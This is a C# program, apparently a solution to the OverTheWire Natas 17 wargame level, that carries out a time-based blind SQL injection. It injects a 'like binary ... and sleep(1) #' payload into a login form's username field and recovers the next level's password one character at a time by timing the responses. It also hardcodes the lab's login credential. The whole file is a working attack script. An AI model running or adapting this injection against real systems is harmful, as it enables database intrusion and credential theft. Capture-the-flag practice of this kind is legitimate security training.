using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;
using System.Diagnostics;

namespace natas17
{
    class Program
    {
        static void Main(string[] args)
        {
            Task t = new Task(Force);
            t.Start();
            Console.ReadLine();

        }

        static async void Force()
        {
            string allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            string login = "natas17";
            string pass = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw";
            string url = "http://natas17.natas.labs.overthewire.org";
            string existChar = "";
            string password = "";
            Stopwatch timer = new Stopwatch();
            Stopwatch allTimer = new Stopwatch();
            HttpClientHandler handler = new HttpClientHandler();
            handler.Credentials = new NetworkCredential(login, pass);
            HttpClient client = new HttpClient(handler);
            allTimer.Start();
            for (int i = 0; i < allChars.Length; i++)
            {
                var values = new Dictionary<string, string>
                {
                    {"username","natas18\" and password like binary \"%"+allChars[i]+"%\" and sleep(1) #"},
                };
                timer.Reset();
                timer.Start();
                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(url, content);
                //var allContent = await response.Content.ReadAsStringAsync();
                timer.Stop();
                //Console.WriteLine("{0}", allContent);
                //Console.WriteLine("{0} ms", timer.ElapsedMilliseconds);
                if (timer.ElapsedMilliseconds >= 1000)
                {
                    existChar += allChars[i];
                    Console.WriteLine("Chars: {0}", existChar);
                }
            }
            for (int i = 0; i < 32; i++)
            {
                for (int j = 0; j < existChar.Length; j++)
                {
                    var values = new Dictionary<string, string>
                    {
                        {"username", "natas18\" and password like binary \""+password+existChar[j]+"%\" and sleep(1) #" },
                    };

                    timer.Reset();
                    timer.Start();
                    var content = new FormUrlEncodedContent(values);
                    var response = await client.PostAsync(url, content);


                    timer.Stop();
                    //Console.WriteLine("{0} ms", timer.ElapsedMilliseconds);
                    if (timer.ElapsedMilliseconds >= 1000)
                    {
                        password += existChar[j];
                        Console.WriteLine("password: {0}", password);
                        break;
                    }
                }
            }
            allTimer.Stop();
            Console.WriteLine("Break time: {0} ms", allTimer.ElapsedMilliseconds);
            Console.WriteLine("Finally password: {0}", password);
            
        }

    }

    internal class FromUrlEncodedContent
    {
        private Dictionary<string, string> values;

        public FromUrlEncodedContent(Dictionary<string, string> values)
        {
            this.values = values;
        }
    }
}
